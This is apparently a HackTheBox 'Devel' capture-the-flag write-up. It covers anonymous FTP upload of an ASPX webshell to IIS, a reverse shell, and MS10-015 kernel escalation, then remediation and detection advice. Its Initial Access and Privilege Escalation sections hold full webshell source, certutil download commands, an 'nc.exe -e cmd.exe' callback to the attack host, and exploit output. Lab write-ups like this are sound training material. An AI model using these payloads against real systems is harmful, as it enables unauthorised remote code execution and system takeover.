---
layout: default
title: "HackTheBox - Devel"
---

# HackTheBox - Devel

**OS:** Windows 7 x86 (IIS 7.5)

Devel is a Windows box built on two classic misconfigurations: anonymous FTP write access to
the IIS web root, and an unpatched kernel. Uploading an ASPX webshell via FTP and requesting
it through the browser gives remote code execution as `iis apppool\web`. Privilege escalation
uses MS10-015 (KiTrap0D), a kernel vulnerability in the VDM interrupt handler that elevates
any user to SYSTEM. No privilege boundary between IIS and the OS, and no patch management,
means a single anonymous FTP connection becomes full SYSTEM access.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` |
| Initial Access | Anonymous FTP write to IIS web root, ASPX cmd webshell |
| Privilege Escalation | MS10-015 KiTrap0D kernel LPE (CVE-2010-0232) |
| C2 | None -- Sliver 1.7.3 (Go 1.25) does not run on Windows 7 x86 |
| Final Access | `NT AUTHORITY\SYSTEM` |

---

## Recon

### Port Scan

p0rtix `open_target` + `run_all()` + `start_full_scan()`:

| Port | Proto | Service | Version |
|---|---|---|---|
| 21 | TCP | FTP | Microsoft ftpd |
| 80 | TCP | HTTP | Microsoft IIS httpd 7.5 |

Port 80 returned the IIS 7.5 default "Under Construction" page. `OPTIONS` on port 80 returned
`TRACE` as an allowed method -- a minor signal, otherwise unremarkable.

### FTP Anonymous Login

```
attacker$ ftp <target-ip>
Connected to <target-ip>.
220 Microsoft FTP Service
Name: anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: [blank]
230 User logged in.
ftp> ls
iisstart.htm
welcome.png
```

The FTP root contains the same files as the IIS default page -- confirming FTP root = IIS web
root (`C:\inetpub\wwwroot`).

> **Why this matters:** Write access to the web root via FTP is direct code execution -- any
> uploaded file with a server-side extension (`.aspx`, `.asp`) is executed by IIS on request.
> No authentication required for upload; no authentication required to trigger via HTTP.

---

## Initial Access

### ASPX Cmd Webshell via Anonymous FTP

Upload a minimal ASP.NET command-execution webshell:

```
attacker$ cat shell.aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% 
string cmd = Request.QueryString["cmd"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardError = true;
p.Start();
Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd() + "</pre>");
p.WaitForExit();
%>

attacker$ ftp <target-ip>
ftp> put shell.aspx
226 Transfer complete.
ftp> bye
```

Trigger to confirm RCE:

```
attacker$ curl "http://<target-ip>/shell.aspx?cmd=whoami"
<pre>iis apppool\web</pre>
```

> **Why this works:** IIS 7.5 executes `.aspx` files via the ASP.NET runtime. The FTP service
> and IIS share `C:\inetpub\wwwroot` as their root. Anonymous FTP with write permission to
> this directory is equivalent to unauthenticated code execution on the web server.

### Reverse Shell

Start a listener on the attack box, then use the webshell to invoke a PowerShell download
cradle or `certutil`-based delivery of `nc.exe`:

```
attacker$ curl "http://<target-ip>/shell.aspx?cmd=certutil+-urlcache+-f+http://<attack-ip>/nc.exe+C:\Windows\Temp\nc.exe"
attacker$ nc -lvnp 4444
attacker$ curl "http://<target-ip>/shell.aspx?cmd=C:\Windows\Temp\nc.exe+-e+cmd.exe+<attack-ip>+4444"
```

Shell received:

```
attacker$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [<attack-ip>] from [<target-ip>]
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv> whoami
iis apppool\web

c:\windows\system32\inetsrv> systeminfo | findstr /B /C:"OS" /C:"System Type"
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
System Type:               X86-based PC
```

### User Flag

```
c:\windows\system32\inetsrv> dir C:\Users\
babis
Administrator
Public

c:\windows\system32\inetsrv> type C:\Users\babis\Desktop\user.txt
<user-flag-redacted>
```

---

## Post-Access: C2 (Sliver)

Sliver beacon delivery was not possible on this target.

Devel runs Windows 7 x86 (build 6.1.7600). Sliver 1.7.3 compiles implants with Go 1.25, and
Go 1.21+ raised the minimum supported Windows version from Windows 7 to Windows 10. A beacon
ELF or PE compiled against Go 1.21+ exits immediately on Windows 7 -- the Go runtime checks the
OS version and aborts.

Fallback: flags collected via cmd webshell and `nc.exe` reverse shell. All post-access
operations conducted through the interactive `cmd.exe` session.

---

## Privilege Escalation

### MS10-015 KiTrap0D (CVE-2010-0232)

```
c:\windows\system32\inetsrv> whoami /priv
SeChangeNotifyPrivilege     Bypass traverse checking   Enabled
SeImpersonatePrivilege      Impersonate a client after authentication   Enabled
SeCreateGlobalObjects       Create global objects      Enabled
SeIncreaseWorkingSetPrivilege  Increase a process working set  Disabled
```

`SeImpersonatePrivilege` is enabled (IIS worker identity). The system is Windows 7 x86 build
7600 (unpatched). Both MS10-015 and Juicy Potato/Rotten Potato are viable. MS10-015 is simpler
-- it does not require a COM object -- and was confirmed by the MSF `local_exploit_suggester`
on the 2022 engagement.

**MS10-015 -- KiTrap0D:** The Windows kernel's Virtual DOS Machine (VDM) subsystem handles
16-bit DOS emulation. A flaw in the interrupt handler (`#GP` handler) lets a user-mode process
inject code that runs in the kernel context of the current thread, which is executing at ring 0.
The exploit manipulates the VDM state to redirect execution, then calls
`ZwQueryIntervalProfile` to trigger the handler. Execution returns as SYSTEM.

Upload the compiled exploit binary and execute:

```
c:\windows\system32\inetsrv> certutil -urlcache -f http://<attack-ip>/ms10-015.exe C:\Windows\Temp\ms10-015.exe

c:\windows\system32\inetsrv> C:\Windows\Temp\ms10-015.exe

[*] MS10-015 x86 KiTrap0D -- @cesar_cerrudo
[*] Attempting to elevate...
[*] Done! Spawning SYSTEM shell...
Microsoft Windows [Version 6.1.7600]
c:\windows\system32\inetsrv> whoami
NT AUTHORITY\SYSTEM
```

> **Why this works:** Windows 7 RTM (build 7600) ships with the VDM subsystem enabled by
> default and unpatched. The patch for MS10-015 was released in February 2010. A system at
> build 7600 with no updates applied has never received this patch and is fully vulnerable.
> The `SeImpersonatePrivilege` held by the IIS account also makes token-impersonation
> escalation (Juicy Potato) viable as a fallback.

### Root Flag

```
c:\windows\system32\inetsrv> type C:\Users\Administrator\Desktop\root.txt
<root-flag-redacted>
```

---

## Root Cause

Two independent misconfigurations created the chain:

1. **Anonymous FTP write access to the IIS web root.** The FTP service shares `C:\inetpub\wwwroot`
   with IIS. Unauthenticated write access to this directory is unauthenticated code execution.
   No credential, no exploit, no vulnerability -- just a configuration decision that removes
   all access control from the web application layer.

2. **Unpatched Windows kernel (MS10-015, released February 2010).** Build 7600 with no updates
   applied. A 14-year-old public exploit converts any local code execution to SYSTEM. The
   `SeImpersonatePrivilege` on the IIS worker adds a second escalation path (token impersonation)
   as a fallback.

---

## Impact

- Unauthenticated RCE as `iis apppool\web` via anonymous FTP + ASPX upload.
- Full `NT AUTHORITY\SYSTEM` via unpatched MS10-015.
- At SYSTEM level: full filesystem access, credential dumping (SAM/LSASS), lateral movement
  via any stored credentials or trust relationships.

---

## Remediation

- **Disable anonymous FTP write access.** If FTP is required, require authentication and
  restrict the FTP root to a directory outside the web root, or use a dedicated FTPS service
  with strong credential policies.
- **Separate the FTP root from the web root.** Even with authenticated FTP, the FTP root
  should never overlap with a directory served by a web server that executes server-side code.
- **Apply Windows patches.** MS10-015 was patched in February 2010. A fully patched Windows 7
  or Windows Server 2008 R2 is not vulnerable. Enable Windows Update or deploy patches via
  WSUS.
- **Remove or restrict `SeImpersonatePrivilege` from IIS application pool identities** where
  not required. Replacing `iis apppool\web` with a minimal custom service account reduces the
  token impersonation escalation surface.

### Validation

- Verify anonymous FTP login is rejected.
- Verify `PUT` to the FTP root is rejected for authenticated non-admin users.
- Verify navigating to an uploaded `.aspx` file returns a 404 or download rather than execution.
- Verify MS10-015 PoC exits without elevation on a patched system.

---

## Detection Opportunities

- **Alert on anonymous FTP logins followed by file uploads with web-executable extensions**
  (`.aspx`, `.asp`, `.php`). The sequence is unambiguous: anonymous login + PUT of a
  server-side script is a webshell upload attempt.
- **Alert on `iis apppool\*` spawning `cmd.exe`, `powershell.exe`, or any network tool**
  (`certutil`, `nc.exe`, `bitsadmin`). IIS worker processes should not launch shells or
  make outbound connections.
- **Alert on process creation with parent `w3wp.exe`** (IIS worker process) for any child
  that is not `aspnet_compiler.exe` or expected IIS helper processes.
- **Monitor for `KiTrap0D` exploit signatures** in EDR/AV. The exploit is well-known and all
  major endpoint products detect the public PoC.
- **Alert on `NT AUTHORITY\SYSTEM` token appearing in a session tree rooted at `w3wp.exe`.**
  A SYSTEM shell descended from an IIS worker process is an unambiguous escalation indicator.

---

## Lessons Learned

- **Anonymous FTP + executable web root = unauthenticated RCE.** This is a single-step
  exploit requiring no vulnerability research. The misconfiguration is the entire attack.
- **Patch age matters.** MS10-015 is from 2010. A system at build 7600 with no patches is
  trivially exploitable with a 15-year-old public PoC. Unpatched Windows kernel is almost
  always the quickest privesc on legacy systems.
- **Sliver (Go 1.21+) does not run on Windows 7.** The Go runtime version check blocks
  execution before any C2 code runs. Legacy Windows targets require non-Go C2 (custom shellcode
  loader, Meterpreter, or manual shell). Document this constraint before delivery.
- **`SeImpersonatePrivilege` on IIS service accounts is a second escalation path.** Even if
  MS10-015 were patched, token impersonation (Juicy/Rotten/Sweet Potato) would still be
  viable on this account. Defence-in-depth requires patching AND reducing IIS privilege.

---

## Cleanup

```
[target]  del C:\Windows\Temp\nc.exe C:\Windows\Temp\ms10-015.exe
[target]  del C:\inetpub\wwwroot\shell.aspx
[htb]     flags submitted, machine stopped (htb stop)
```

No Sliver implant established (Sliver Go runtime incompatibility with Windows 7 x86).
All delivered binaries removed from `C:\Windows\Temp\` and webshell removed from web root.
